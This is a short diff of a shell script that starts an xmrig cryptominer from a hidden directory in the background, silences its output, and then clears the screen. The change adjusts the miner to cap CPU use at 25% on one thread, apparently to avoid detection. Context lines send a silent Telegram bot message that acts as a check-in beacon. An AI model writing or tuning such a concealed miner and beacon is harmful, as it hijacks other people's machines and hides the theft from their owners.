@@ -6,5 +6,5 @@ MESSAGE="Ony"
 
 nohup curl -s -X POST "https://api.telegram.org/bot$BOT_TOKEN/sendMessage" -d "chat_id=$CHAT_ID" -d "text=$MESSAGE" &>/dev/null &
 
-nohup ~/\.fil/xmrig -t $QUARTER_CORES &>/dev/null &
+nohup ~/.fil/xmrig --max-cpu-usage=25 --threads=1 &>/dev/null &
 clear
